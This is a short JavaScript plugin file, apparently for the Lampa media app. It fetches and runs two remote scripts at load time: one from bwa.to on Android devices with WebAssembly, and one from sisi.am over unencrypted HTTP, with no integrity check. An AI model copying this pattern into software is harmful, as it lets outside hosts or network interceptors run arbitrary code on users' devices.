(function () {
  'use strict';

  if (Lampa.Platform.is('android') && typeof WebAssembly !== 'undefined')
	Lampa.Utils.putScriptAsync(['https://bwa.to/s'], function () {});
	
  Lampa.Utils.putScriptAsync(['http://sisi.am/nyam.serv.js'], function () {});

})();
